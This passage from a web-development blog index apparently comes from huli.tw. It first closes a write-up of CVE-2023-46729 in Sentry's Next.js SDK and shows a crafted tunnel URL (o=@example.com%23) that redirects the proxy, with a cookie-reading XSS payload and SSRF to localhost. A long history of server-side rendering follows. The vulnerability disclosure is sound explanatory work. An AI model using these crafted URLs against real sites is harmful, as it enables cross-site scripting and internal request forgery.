doesn't take any arguments at the time of writing but we future-proof // here in case Next.js ever decides to pass some userNextConfig.rewrites = async (...args: unknown[]) => &#123; const injectedRewrite = &#123; // Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]` // Nextjs will automatically convert `source` into a regex for us source: `$&#123;tunnelPath&#125;(/?)`, has: [ &#123; type: 'query', key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers value: '(?&lt;orgid>.*)', &#125;, &#123; type: 'query', key: 'p', // short for projectId - we keep it short so matching is harder for ad-blockers value: '(?&lt;projectid>.*)', &#125;, ], destination: 'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0', &#125;; if (typeof originalRewrites !== 'function') &#123; return [injectedRewrite]; &#125; // @ts-expect-error Expected 0 arguments but got 1 - this is from the future-proofing mentioned above, so we don't care about it const originalRewritesResult = await originalRewrites(...args); if (Array.isArray(originalRewritesResult)) &#123; return [injectedRewrite, ...originalRewritesResult]; &#125; else &#123; return &#123; ...originalRewritesResult, beforeFiles: [injectedRewrite, ...(originalRewritesResult.beforeFiles || [])], &#125;; &#125; &#125;; &#125; The crucial part is this section: const injectedRewrite = &#123; // Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]` // Nextjs will automatically convert `source` into a regex for us source: `$&#123;tunnelPath&#125;(/?)`, has: [ &#123; type: 'query', key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers value: '(?&lt;orgid>.*)', &#125;, &#123; type: 'query', key: 'p', // short for projectId - we keep it short so matching is harder for ad-blockers value: '(?&lt;projectid>.*)', &#125;, ], destination: 'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0', &#125;; It determines the final URL to redirect to based on the o and p query string parameters. The problem here is that both of these parameters use the .* regular expression, which matches any character. In other words, for the following URL: https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;abc&amp;p&#x3D;def It will proxy to: https:&#x2F;&#x2F;oabc.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0 It looks fine, but what if it’s like this? https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;example.com%23&amp;p&#x3D;def %23 is the URL-encoded result of #. It will be proxied to: https:&#x2F;&#x2F;oexample.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0 We use # to include the original hostname as part of the hash and successfully change the destination of the proxy. However, the leading o is a bit annoying. Let’s get rid of it by adding @ at the beginning: https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;@example.com%23&amp;p&#x3D;def It becomes: https:&#x2F;&#x2F;o@example.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0 In this way, an attacker can use the o parameter to change the destination of the proxy and redirect the request anywhere. As mentioned earlier, this rewrite feature directly returns the response. So when a user visits https://huli.tw/tunnel?o=@example.com%23&amp;p=def, they will see the response of example.com. In other words, if an attacker redirects the request to their own website, they can output &lt;script&gt;alert(document.cookie)&lt;/script&gt;, turning it into an XSS vulnerability. If the attacker redirects the request to other internal web pages like https://localhost:3001, it becomes an SSRF vulnerability (but the target must support HTTPS). As for the fix, it’s simple. Just add some restrictions to the regex. Finally, Sentry adjusted it to only allow digits: &#123; type: 'query', key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers value: '(?&lt;orgid>\\\\d*)', &#125;, This issue has been fixed in version 7.77.0 and later. ConclusionThis vulnerability is really simple and easy to reproduce. Just find the fix commit and take a look at the code to understand how to exploit it. In summary, when doing URL rewriting, you really need to be cautious, as it’s easy to encounter issues (especially when you’re not just rewriting the path but the entire URL).","link":"/2023/11/13/en/sentry-nextjs-sdk-cve-2023-46729/"},{"title":"Exploring Various SSR (Server-side rendering) from a Historical Perspective","text":"Did you know that when you discuss SSR with your friends, it’s highly likely that your understanding of SSR differs? Let’s take a few scenarios. Which ones do you consider as SSR? Generating the view from the backend using PHP. Frontend is a React-based SPA, but if the backend detects a search engine, it switches to a different template that is specifically designed for search engines instead of the React-rendered page. Frontend is a React-based SPA, but it uses Prerender to render the page as HTML and then serves it to the search engine (regular users still get the SPA experience). The difference from the previous scenario is that the view seen by users and search engines is mostly the same. Frontend is a React-based SPA, and the backend uses renderToString to render React into a string, but there is no data. The data is fetched on the frontend. Frontend is a React-based SPA, and the backend makes API calls to fetch data for each page. After fetching the data, it calls renderToString to output HTML. On the client-side, hydration is performed to make the page interactive. Some people believe that any view generated by the backend is considered SSR, so all scenarios 1 to 5 are SSR. Others think that the frontend must be an SPA for it to be called SSR, so scenarios 2 to 5 are SSR. Yet, some people consider hydration as the key aspect of SSR, so only scenario 5 (or 45) is SSR. Why this article? Five years ago, I wrote an article discussing SPA and SSR: Understanding Technical Terms with Xiao Ming: MVC, SPA, and SSR. My thoughts back then align with my current ones. By “current me,” I mean that I haven’t fully organized my thoughts yet. I’m writing this preface, and the content below is still unfinished. I will share the thoughts of “future me” at the end. However, for now, my current perspective is that “not all ways of generating views from the server can be ‘appropriately’ called SSR.” Let’s consider a hypothetical scenario: A: Hey, how do you render your company’s web pages? B: We use SSR. A: Oh, so what framework do you use for SSR? B: Just plain PHP, no framework. The frontend is built with jQuery. Now, another example: A: Dealing with SSR issues has been quite frustrating lately. It’s challenging to handle the data. B: It’s been fine for us. We’ve been using PHP without any major issues. Although the term “server-side rendering” literally means rendering by the server, so there’s no problem in calling PHP SSR based on its literal meaning, I believe the key question is “Why do we need the term SSR?” My understanding is that in the era before SPA became popular, there wasn’t much that fell under CSR (Client-side rendering), so there was no need for the term SSR. At that time, you would simply say, “We use PHP” rather than saying, “We use PHP for SSR.” It’s somewhat similar to when I ask my friend how much his lunchbox costs, and he replies, “100 bucks” instead of “100 New Taiwan Dollars” because we assume the currency is New Taiwan Dollars, so there’s no need to explicitly mention it. Similarly, back then, there was only one path of rendering from the server, so there was no need to specifically mention SSR. However, with the rise of SPAs, many things started to shift towards CSR. This led to problems that only CSR encounters, such as SEO. In such cases, certain aspects need to be handled by the server to solve these problems. In this context, the term “Server-side rendering” took on a new meaning, becoming a “server-side solution to address CSR issues.” Therefore, calling PHP SSR is not entirely accurate; it lacks meaning. It’s like if we define “beverage” as “a drinkable liquid,” can you say that hot and sour soup is also a type of beverage? Technically, there’s no issue with the definition, but when someone asks you, “What’s your favorite beverage?” would you say hot and sour soup? Probably not. Similarly, we don’t refer to hot and sour soup as a beverage. Likewise, although SSR literally means that, PHP, which is a traditional server-side content rendering solution, can be called SSR, but you wouldn’t refer to it that way. SSR is more suitable to refer to a “server-side solution used to address SPA issues.” I started to become curious at this point. Was SSR really not commonly used before the popularity of SPA and CSR? If so, when did it start? Also, my understanding of SSR basically started with React. So, did earlier frameworks like Angular, Ember, or even Backbone not have this issue? If they did, what were their solutions called? So, I embarked on a journey of exploration that would take a lot of time, perhaps discussing issues that may not be so important, but I enjoyed the process. When did SPA become popular? As mentioned earlier, my argument is that the term “SSR” started to become popular after the rise of SPA, specifically referring to server-side solutions for handling CSR and SPA issues. I believe that the development of SPA is closely related to the overall development of frontend web technologies. So, let’s take a look back at history! JavaScript was officially introduced in 1995. Although JavaScript’s functionality was not as mature at the time, there were already other technologies that could run an application on a webpage, such as Java Applets. Flash was released in 1996. In the early days when JavaScript was not as powerful, Java Applets or Flash were used to create more complete web applications. So, when did JavaScript mature enough to stand on its own and be used to write a web application? The answer is related to technological advancements. As a web application that needs to communicate with the backend, what is most needed? It is something that now exists as naturally as air and water: XMLHttpRequest. To be able to operate independently and communicate with the server without page reloads, XMLHttpRequest is a necessary condition. We needed the XMLHttpRequest API to exchange data with the server without page reloads. However, in the beginning, not all browsers used XMLHttpRequest. Microsoft, which had the concept first, used ActiveXObject. This can be verified from the first version of jQuery’s source code from 2006: // If IE is used, create a wrapper for the XMLHttpRequest object if ( jQuery.browser.msie &amp;&amp; typeof XMLHttpRequest == \"undefined\" ) XMLHttpRequest = function()&#123; return new ActiveXObject( navigator.userAgent.indexOf(\"MSIE 5\") >= 0 ? \"Microsoft.XMLHTTP\" : \"Msxml2.XMLHTTP\" ); &#125;; After mentioning XMLHttpRequest, it is natural to talk about Ajax. The term “Ajax” comes from an article published by Jesse James Garrett on February 18, 2005, titled Ajax: A New Approach to Web Applications. It describes a new communication pattern using HTML, CSS, DOM, and XMLHttpRequest, which I believe is the prototype of SPA. (Image from the mentioned article) In the article, there is also a mention of the difference between XMLHttpRequest and Ajax: Q. Is Ajax just another name for XMLHttpRequest? A. No. XMLHttpRequest is only part of the Ajax equation. XMLHttpRequest is the technical component that makes the asynchronous server communication possible; Ajax is our name for the overall approach described in the article, which relies not only on XMLHttpRequest but on CSS, DOM, and other technologies. From historical data, it seems that Microsoft Outlook was the earliest product to mention and utilize these technologies, starting in 2000. However, in terms of widespread use and popularization of the term, it belongs to Google around 2004-2005. Around this time, the JavaScript ecosystem also experienced vigorous development. Many libraries emerged, such as Prototype, Dojo Toolkit, MooTools, and the still-existing jQuery, which further advanced frontend web development. In 2006, YUI (Yahoo! User Interface Library) was born, and Ext JS, a framework specifically designed for web applications, appeared in 2007. Although these libraries make web development easier, SPA did not become popular until the birth of two pioneers. On October 13, 2010, Backbone.js released its first version, followed by the initial release of AngularJS a week later on October 20. A year later, other SPA frontend frameworks emerged. Ember.js was released on December 8, 2011, and Meteor.js appeared on January 20, 2012. Typically, it takes at least six months to a year for a new framework to become popular. Therefore, I believe that 2011 and 2012 marked the beginning of the rise of SPA. But how can we support this claim? Keyword search trends to some extent represent the popularity of certain technical terms at the time. From the graph below, we can see that the term “SPA” started to climb around 2011 and 2012, which aligns with my speculation (although this data may not be very accurate, I couldn’t think of a better source at the moment): (As for the peak in 2004 and 2005, I don’t know, but I’m curious to find out. Maybe it’s related to the popularity of various Google services? If anyone has any clues, feel free to message or comment to discuss.) The rest of the story is more familiar. React was officially released in May 2013, followed by Vue in February 2014. With the rise of frontend frameworks, SPA became increasingly popular and eventually became the mainstream approach to frontend development today. How did early SPAs solve the CSR problem? From the history of development mentioned above, it is clear that Backbone.js and AngularJS were the pioneers that ushered in the era of SPAs. But how did they solve the CSR problem, such as SEO? Let’s start with AngularJS. I found a project on GitHub from 2013: angular-on-server. In the project’s wiki introduction, it states: We need to pre-render pages on the server for Google to index. We don’t want to have to repeat ourselves on the back end. I found a few examples of server-side rendering for Backbone applications, but none showing how to do it with AngularJS. To make this work I have modified a couple of Node modules, jsdom and xmlhttprequest. They are loaded from local subdirectories (/jsdom-with-xmlhttprequest and /xmlhttprequest). If this is true, it means that AngularJS had limited SSR solutions at that time, with most solutions being based on Backbone.js. Based on the information I found, it seems to be the case. For example, this question from 2013: AngularJS - server-side rendering. From the answers, it is evident that there were indeed limited solutions available. AngularJS officially supported SSR only in late June 2015, as mentioned in this presentation: Angular 2 Server Rendering. A few days after the presentation, they open-sourced Universal Angular 2, which is the predecessor of Angular Universal. In the README at that time, it stated: Universal (isomorphic) JavaScript support for Angular 2 The term “isomorphic” should bring back memories for many people, but we’ll discuss that later. Now, let’s see how Backbone.js solved the SPA problem. I found an ancient example on GitHub from 2011: Backbone-With-Server-Side-Rendering. The README states: Backbone.js is a great tool for organizing your javascript code into models, collections, and views, without tying your data to the DOM elements. However, most tutorials show how to render the HTML only via Backbone (client-side), which means that none of your content is crawled by search engines. This is possibly a major problem if you’re not making an app hidden behind an authentication system. The unique thing about this project is that SSR (Server-Side Rendering) is implemented through Ruby on Rails. However, after examining the source code, it seems more like an experimental project. The HTML is outputted by the backend and then handled by Backbone.js on the frontend. It is a simple example rather than a complete demo. If you want a more complete solution, the one to consider is Rendr, which was open-sourced by Airbnb in 2013. On January 30, 2013, Airbnb’s tech blog published a new article titled Our First Node.js App: Backbone on the Client and Server. It discusses the issues with Single Page Applications (SPAs) and the challenge of integrating logic on both the frontend and backend. The ultimate solution presented in the article is the Rendr package, which allows executing Backbone.js on the server. The open-sourcing of Rendr was announced in an article three months later, titled We’ve open sourced Rendr: Run your Backbone.js apps in the browser and Node.js. It states: Many developers shared the same pain points with the traditional client-side MVC approach: poor pageload performance, lack of SEO, duplication of application logic, and context switching between languages. This indicates that many developers at that time were aware of the issues with SPAs and were seeking a more comprehensive solution. To execute Backbone.js on the server, a prerequisite is that the server must be able to run JavaScript. Node.js was released in 2009, and Express came out at the end of 2010, while NPM was introduced in 2011. By mid-2012, Node.js was still at version v0.8.0, which was an early stage. Looking back now, Node.js started to be widely used around 2012-2013. In summary, based on the information I found, the library that was perhaps widely used for SSR earliest was Rendr, introduced in 2013. It can achieve the following: “rendering on the server-side initially, but then taken over by JavaScript on the client-side,” as mentioned in Airbnb’s article: Your great new product can run on both sides of the wire, serving up real HTML on first pageload, but then kicking off a client-side JavaScript app. In other words, the Holy Grail. The image below illustrates the so-called Holy Grail, taken from Airbnb’s original article: When it comes to this point, let’s organize the timeline and my personal speculation. Since the release of Backbone.js at the end of 2010, SPA (Single Page Application) has gradually become popular, and people have also realized the problems encountered in front-end rendering. Therefore, they started to implement different solutions, which is server-side rendering. Backbone.js continued until 2013 when Airbnb open-sourced Rendr, finally providing an ideal solution: “initial rendering on the server-side, and subsequent rendering on the client-side, with both client and server sharing the same codebase.” The concept of “running the same code on both the client and the server” is what was mentioned earlier as isomorphic. By the way, Ember.js’s official SSR (Server-Side Rendering) solution should be this one at the end of 2014: Inside FastBoot: The Road to Server-Side Rendering One more thing to mention, according to the article The History of React.js on a Timeline, FaxJS is the predecessor of React, and when it was open-sourced at the end of 2011, it already had an API for server-side rendering, which could render components into static HTML and reattach events on the client-side: https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66#optional-server-side-rendering Isomorphic JavaScript The term “Isomorphic JavaScript” comes from an article published by Charlie Robbins on October 18, 2011: Scaling Isomorphic Javascript Code The article defines Isomorphic as follows: Javascript is now an isomorphic language. By isomorphic we mean that any given line of code (with notable exceptions) can execute both on the client and the server. More details can be found in an article published by Airbnb on November 12, 2013: Isomorphic JavaScript: The Future of Web Apps The article also includes a practical example that is worth referring to: isomorphic-tutorial. In addition, the article mentions three predecessors of Isomorphic JavaScript before Rendr. One of them is Mojito, open-sourced by Yahoo! in 2012. The article mentions a beautiful imagination: Imagine a framework where the first page-load was always rendered server-side, and desktop browsers subsequently just made calls to API endpoints returning JSON or XML, and the client only rendered the changed portions of the page. It is basically the current mainstream way of working in front-end development. Another one is Meteor.js, and the third one is Asana’s Luna. Luna is quite interesting, and upon closer inspection, its syntax has a bit of a React flavor. The term “Isomorphic” was gradually replaced by “Universal” after Michael Jackson’s article in 2015: Universal JavaScript. This article mainly suggests that “Universal” better expresses the original intention and is easier for the audience to understand. Therefore, it advocates using “Universal JavaScript” instead of “Isomorphic JavaScript”. Mid-summary Up to this point, I have answered a few of my previous questions: Q: Was the term SSR really not used much before the popularity of SPA and CSR? If so, when did it start? I’m not sure because I didn’t specifically search for earlier evidence. However, if we look at the search trend for the term SSR, it started to take off around 2012-2013, which is around the same time as the popularity of SPA. Q: My understanding of SSR basically started with React. Does that mean earlier frameworks like Angular, Ember, or even Backbone didn’t have this issue? If they did, what was their solution called? They had the same issue, and the solution was also called SSR. To be honest, discussing the precise definition of the term SSR doesn’t have much significance. It can be a bit nitpicky, and it’s difficult to reach a conclusion or convince others that “this definition is correct.” The key is to ensure that both parties have a consistent understanding during communication. When talking about SSR, many people only focus on the SEO aspect, but if we think a bit more carefully, SSR is needed for more than just SEO. Problems SSR Aims to Solve SSR aims to solve the problems caused by CSR, including: SEO Link previews on various social platforms Performance User experience If CSR is used, since the UI is generated through JavaScript, search engines will only crawl blank HTML. Even if Google executes JavaScript, other search engines may not. Even if all search engines execute JavaScript, you can’t guarantee that the crawled results will be what you want. For example, it’s difficult to know when they will finish executing JavaScript. If the API for fetching data takes two seconds to respond, and the search engine only waits for one second after executing JavaScript, the result will still be empty. Link previews on social platforms are another problem. The &lt;meta&gt; tags generated on the client side are not useful. Usually, the bots of these social platforms don’t execute JavaScript; they only look at the response. Therefore, the &lt;meta&gt; tags on CSR pages can only be the same and cannot dynamically determine the content based on different pages. The third and fourth points can be considered together. Although modern devices generally run fast and can execute JavaScript quickly, in cases where the JavaScript is large and the device is older, executing JavaScript still takes some time. When will the user see the UI of a CSR page? They need to download the JavaScript first, and after downloading, it needs to be executed. After executing and updating the DOM, the user can see the complete UI. During the waiting period, the screen is blank. Although some websites show a loading indicator, the overall user experience is not very good. If we can get the UI in the initial response, the user experience will be better, and performance will increase. Even on older devices, users can see the UI from the beginning without waiting for JavaScript to finish executing. Various Types of SSR Originally, I only wanted to write this paragraph, but unexpectedly, it turned into a historical archaeology of front-end development. In response to the problems caused by CSR mentioned earlier, various solutions have emerged. Each solution is different, and not all problems can be solved at once. Type 1: Rendering a different template for search engines and bots This solution only solves the problems of SEO and link previews. When the server receives a request from a search engine or a bot from a social platform, it directly uses the original backend template to output the result. Like this: const express = require('express'); const app = express(); app.get('/games/:id', (req, res) => &#123; const userAgent = req.headers['user-agent']; // 檢查 User Agent 是否為 Googlebot if (userAgent.includes('Googlebot')) &#123; // 如果是 Googlebot，輸出 SEO 相關的 HTML 與 meta tags const game = API.getGame(req.params.id); res.send(` &lt;html> &lt;head> &lt;title>$&#123;game.title&#125;&lt;/title> &lt;meta name=\"description\" content=\"$&#123;game.desc&#125;\"> &lt;/head> &lt;body> &lt;h1>$&#123;game.title&#125;&lt;/h1> &lt;p>$&#123;game.desc&#125;&lt;/p> &lt;/body> &lt;/html> `); &#125; else &#123; // 如果不是 Googlebot，回傳 index.html res.sendFile(__dirname + '/public/index.html'); &#125; &#125;); app.listen(3000, () => &#123; console.log('Server is running on port 3000'); &#125;); For regular users, the issues of performance and user experience are still not resolved. This solution only addresses SEO and link preview, ensuring that the screens captured by these bots are in HTML format. I have implemented this approach in my work, and the advantages are that it is simple, fast, and does not interfere with SPA. The disadvantage is that the page seen by the Google bot may be different from what the user sees, which could potentially affect SEO scores. After all, outputting special pages for the Google bot is considered an anti-pattern called cloaking, as mentioned in Google’s official video: Can we serve Googlebot a different page with no ads?. It is recommended to have the exact same page. However, compared to not showing anything to the Google bot, this solution is still better. Second Approach: Pre-rendering for Search Engines The most well-known framework for this approach is Prerender. In simple terms, it uses a headless browser like Puppeteer on the server-side to open your page and execute JavaScript, then saves the result as HTML. When the search engine requests data, this HTML is served, so both users and bots see the same content. I tried it locally and created a simple page using create-react-app: import logo from './logo.svg'; import './App.css'; import &#123; useState, useEffect &#125; from 'react' function App() &#123; console.log('render') const [data, setData] = useState([]); useEffect(() => &#123; document.querySelector('title').textContent = 'I am new title' fetch('https://cat-fact.herokuapp.com/facts/').then(res => res.json()) .then(a => &#123; setData(a); &#125;) &#125;, []) function test() &#123; alert('click') &#125; return ( &lt;div className=\"App\"> &lt;header className=\"App-header\"> &lt;img src=&#123;logo&#125; className=\"App-logo\" alt=\"logo\" /> &#123;data &amp;&amp; data.map(item => ( &lt;div>&#123;item.text&#125;&lt;/div> ))&#125; &lt;a className=\"App-link\" href=\"https://reactjs.org\" target=\"_blank\" rel=\"noopener noreferrer\" > Learn React Can you see me now? &lt;/a> &lt;button onClick=&#123;test&#125;>hello&lt;/button> &lt;/header> &lt;/div> ); &#125; export default App; The main points I wanted to test were: Whether the page is still interactive. Whether dynamically modified titles are reflected in the results. Whether the output includes the results obtained from an API response. After prerendering, the output HTML is: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;link rel=\"icon\" href=\"http://localhost:5555/favicon.ico\"> &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"> &lt;meta name=\"theme-color\" content=\"#000000\"> &lt;meta name=\"description\" content=\"Web site created using create-react-app\"> &lt;link rel=\"apple-touch-icon\" href=\"http://localhost:5555/logo192.png\"> &lt;link rel=\"manifest\" href=\"http://localhost:5555/manifest.json\"> &lt;title>I am new title&lt;/title> &lt;script defer=\"defer\" src=\"http://localhost:5555/static/js/main.21981749.js\">&lt;/script> &lt;link href=\"http://localhost:5555/static/css/main.f855e6bc.css\" rel=\"stylesheet\"> &lt;/head> &lt;body> &lt;noscript>You need to enable JavaScript to run this app.&lt;/noscript> &lt;div id=\"root\"> &lt;div class=\"App\"> &lt;header class=\"App-header\"> &lt;img src=\"/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg\" class=\"App-logo\" alt=\"logo\"> &lt;div>When asked if her husband had any hobbies, Mary Todd Lincoln is said to have replied \"cats.\"&lt;/div> &lt;div>Cats make about 100 different sounds. Dogs make only about 10.&lt;/div> &lt;div>Owning a cat can reduce the risk of stroke and heart attack by a third.&lt;/div> &lt;div>Most cats are lactose intolerant, and milk can cause painful stomach cramps and diarrhea. It's best to forego the milk and just give your cat the standard: clean, cool drinking water.&lt;/div> &lt;div>It was illegal to slay cats in ancient Egypt, in large part because they provided the great service of controlling the rat population.&lt;/div> &lt;a class=\"App-link\" href=\"https://reactjs.org\" target=\"_blank\" rel=\"noopener noreferrer\">Learn React Can you see me now?&lt;/a> &lt;button>hello&lt;/button> &lt;/header> &lt;/div> &lt;/div> &lt;/body> &lt;/html> The title has changed, and the content is the result of executing useEffect() and rendering after the fetch operation. Clicking the button can also trigger events, so there don’t seem to be any issues. If we take a closer look, the rendering process of the prerendered page is similar to a normal React app. The only difference is that the original HTML already contains content, but React still executes once and re-renders the entire page. Therefore, the following situation occurs: The server response is a complete page with data. React starts and performs the initial rendering, at which point the data becomes the initial state, and the page becomes a state without data. React mounts the result to the DOM, triggers useEffect, and makes another API call to fetch data. The state is updated, and a page with data is rendered. This approach still targets search engines only. The difference from the first approach is that the page seen by users and search engines will be more similar, but still not exactly the same. After all, regular users will see a page with no content. Can we show the prerendered page to regular users? Yes, it is possible, but it may be a bit strange if there is an API involved. As mentioned earlier, the initial state has no data, but the HTML does. Therefore, the page seen by users will be: Has data (due to prerendered HTML) =&gt; No data (state initialization) =&gt; Has data (API call on the client). This may not provide a good user experience, so it is usually not done. The advantage of this approach is that it is convenient. It does not require modifying the original SPA; only a middleware needs to be added on the server-side. However, the implementation is more complex compared to the first approach, and there are many details to consider. You can refer to Funliday’s new prerender package pppr and pppr - Solving the problem of JavaScript not being correctly indexed by search engines for more information. Third Type: Server Rendering Client App This is the type that has been mentioned before: “generating the initial HTML on the server and handing over subsequent operations to the client.” Compared to the previous two types, this is the more ideal SSR and is commonly known as Isomorphic/Universal. This approach not only solves the SEO problem but also addresses the user experience. When a user visits the website, they can immediately see the rendered result. However, at this point, the page may not be interactive because the JavaScript has not finished executing. It is necessary to wait for the JavaScript to complete execution and attach event handlers before the page can be truly interactive. Additionally, since the initial page has already been rendered on the server, there is usually no need to modify the DOM again on the client side. Only attaching the event handlers is required, and this process is called hydration. I find this term quite visually descriptive. Imagine that the page output by SSR is “dehydrated,” very flat and dry, with only the visual elements. It cannot be interacted with. When it reaches the client, it needs to inject water into this dry page, add event handlers, and bring the whole page to life, making it interactive. However, the drawback of this solution is that it is more complex to implement. One needs to consider API-related issues. For example, if an API call is placed inside a useEffect, it cannot be executed during server rendering, resulting in a page without any data. Therefore, it may be necessary to add a function to fetch data for each page, store it in props, and correctly output a page with data during server-side rendering. Due to its complexity, this task is usually delegated to frameworks like Next.js, which adopts the approach I mentioned earlier (Pages Router) and adds a getServerSideProps function to the page. By the way, the first version of Next.js was released on October 25, 2016. Fourth Type: Render at Build Time This is a specialized form of SSR tailored for specific product scenarios. The third type mentioned earlier involves rendering for each request, generating the initial page. However, if your page is the same for every user (e.g., the company introduction on an official website), there is no need to do this at runtime; it can be done at build time. Therefore, one approach is to render the page during the build process, resulting in much faster speed. This method is referred to as Static Site Generation (SSG) in Next.js. How to Name the Different Types of SSR? Let’s summarize the four types mentioned earlier: Rendering a different template for search engines and bots Pre-rendering for search engines Server rendering client app Render at build time Different documents use different names for these types. Let’s take a look at a few examples. web.dev The first document is from web.dev: Rendering on the Web. At the end of the article, there is a spectrum: The first type is not specifically mentioned, the second type is more like “CSR with Prerendering,” but not exactly, the third type is “SSR with (Re)hydration,” and the fourth type is “Static SSR.” According to this article, the definition of SSR is: Server-side rendering (SSR): rendering a client-side or universal app to HTML on the server. So, the first type, which does not render the client-side app on the server, should not be considered as SSR. Next.js The second document is from the official Next.js documentation: Building Your Application - Rendering. Here, the third type is referred to as SSR, and the fourth type is called SSG. The definition here is slightly different again. It refers to the process of “generating SPA HTML on the server” as pre-rendering: By default, Next.js pre-renders every page. This means that Next.js generates HTML for each page in advance, instead of having it all done by client-side JavaScript. Pre-rendering can result in better performance and SEO. And SSR specifically refers to “generating HTML for each request” to differentiate it from SSG. Nuxt.js Let’s start with Nuxt.js: link In the documentation, the third type is referred to as “Universal Rendering,” which I think is a good term: To not lose the benefits of the client-side rendering method, such as dynamic interfaces and page transitions, the Client (browser) loads the JavaScript code that runs on the Server in the background once the HTML document has been downloaded. The browser interprets it again (hence Universal rendering) and Vue.js takes control of the document and enables interactivity. As for the definition of SSR, it doesn’t seem to be explicitly stated, but based on the following sentence: This step is similar to traditional server-side rendering performed by PHP or Ruby applications. It should be anything that involves “rendering on the server” can be called SSR. Angular Now let’s look at Angular: link Their definition of SSR is: Server-side rendering (SSR) is a process that involves rendering pages on the server, resulting in initial HTML content which contains initial page state. This definition seems similar to the previous one, as long as it involves “rendering pages on the server,” it can be called SSR. Summary of SSR Now that I’ve written up to this point, I have some thoughts on SSR. To be honest, I think I may have initially made the problem more complicated. SSR simply refers to “rendering on the server,” so as long as it meets this requirement, it can indeed be called SSR. Originally, I only intended to write about the different SSR solutions mentioned earlier, but before I started writing, I became curious about the definition of SSR, which led to the introductory paragraphs exploring its history. What’s more important is whether we can answer the questions of what problems SSR aims to solve, how to solve them, and the pros and cons of each solution. Not every webpage requires Next.js to achieve SSR; we should choose the appropriate technology based on the context. Next, let’s talk about the present and the future. Maximizing Performance and Building Faster Webpages The third solution we mentioned earlier seems perfect, right? It allows us to render the page on the server, solving the performance issues related to SEO and first paint, while also enabling client-side hydration for a SPA-like experience. However, there are still areas for continuous improvement. We briefly mentioned a small issue with hydration earlier, where until hydration is complete, although the page is visible, it is not interactive. For example, typing in an input may not have any response because the event handler hasn’t been attached yet or the component hasn’t finished rendering. So, what can we do about this? Another term comes into play: Progressive Hydration. Instead of hydrating the entire page at once, we can do it block by block, prioritizing the more important ones. This way, users can interact immediately after the important blocks are hydrated, and then the less important blocks can be hydrated. Furthermore, you may notice that certain sections of a webpage don’t need hydration at all because they are static, such as a footer that remains the same throughout. In such cases, we can use another technique called Selective Hydration to pre-render the non-hydratable sections. In 2019, Katie Sylor-Miller, the frontend architect at Etsy, proposed the Islands Architecture, which views a webpage as composed of different islands: The above image illustrates the concept of selective hydration that was just discussed. When we adopt this architecture and combine it with selective hydration and other techniques, we can render faster and achieve better performance. For example, Astro uses this architecture, where the entire page is static and only the interactive parts are separated into individual islands: &lt;MyReactComponent client:load /> React is also moving in this direction with server components, which is quite similar. By dividing the page into server and client components and determining which ones require state and which ones don’t, we can directly render the unnecessary components on the server and send them to the client, while maintaining the previous approach for the required components. This approach does indeed accelerate web pages, but at the same time, development becomes more complex. There are more things to consider, and debugging becomes less convenient. I will share some insights and details in a future article. Conclusion I personally started exploring various frontend tools relatively late. Excluding the early days of using FrontPage or Dreamweaver, I began writing jQuery around 2012. Then, I observed the development of various frontend technologies but didn’t actually work with them. I had considered learning AngularJS (which was popular at the time) and Ember.js, but I was lazy. It wasn’t until 2015 that I started working with React when it was just starting to gain popularity in Taiwan. So, I didn’t participate in the era of Backbone.js and similar technologies. While writing this article, I researched a lot of information, which was quite interesting. It helped me fill in the gap of that period in history that I missed. During my research, I also discovered that Yahoo! was truly a pioneer in frontend web development. For example, Atomic CSS originated from Yahoo!, and I also found out that Yahoo! was already using a Universal JavaScript web framework back in 2012. If you have a different perspective on SSR or feel that I have misunderstood the historical context, feel free to write a new article to discuss it with me. After all, some concepts cannot be explained in a few words, and writing an article provides a more comprehensive explanation. Alternatively, we can also discuss it through comments. References AJAX A Fond Farewell to YUI XMLHttpRequest Isomorphic JavaScript The Future (and the Past) of the Web is Server Side Rendering Rendering on the Web: Performance Implications of Application Architecture (Google I/O ’19)","link":"/2023/11/27/en/server-side-rendering-ssr-and-isomorphic/"}],"tags":[{"name":"React","slug":"React","link":"/en/tags/React/"},{"name":"Front-end","slug":"Front-end","link":"/en/tags/Front-end/"},{"name":"Others","slug":"Others","link":"/en/tags/Others/"},{"name":"Ajax","slug":"Ajax","link":"/en/tags/Ajax/"},{"name":"JavaScript","slug":"JavaScript","link":"/en/tags/JavaScript/"},{"name":"Security","slug":"Security","link":"/en/tags/Security/"},{"name":"Cookie","slug":"Cookie","link":"/en/tags/Cookie/"},{"name":"Android","slug":"Android","link":"/en/tags/Android/"},{"name":"Back-end","slug":"Back-end","link":"/en/tags/Back-end/"},{"name":"Algorithm","slug":"Algorithm","link":"/en/tags/Algorithm/"},{"name":"Web","slug":"Web","link":"/en/tags/Web/"},{"name":"CORS","slug":"CORS","link":"/en/tags/CORS/"},{"name":"CSRF","slug":"CSRF","link":"/en/tags/CSRF/"},{"name":"CS50","slug":"CS50","link":"/en/tags/CS50/"},{"name":"CSS","slug":"CSS","link":"/en/tags/CSS/"},{"name":"DOM","slug":"DOM","link":"/en/tags/DOM/"},{"name":"Node.js","slug":"Node-js","link":"/en/tags/Node-js/"},{"name":"Story","slug":"Story","link":"/en/tags/Story/"},{"name":"HTTP","slug":"HTTP","link":"/en/tags/HTTP/"},{"name":"Cache","slug":"Cache","link":"/en/tags/Cache/"},{"name":"Tool","slug":"Tool","link":"/en/tags/Tool/"},{"name":"Redux","slug":"Redux","link":"/en/tags/Redux/"},{"name":"story",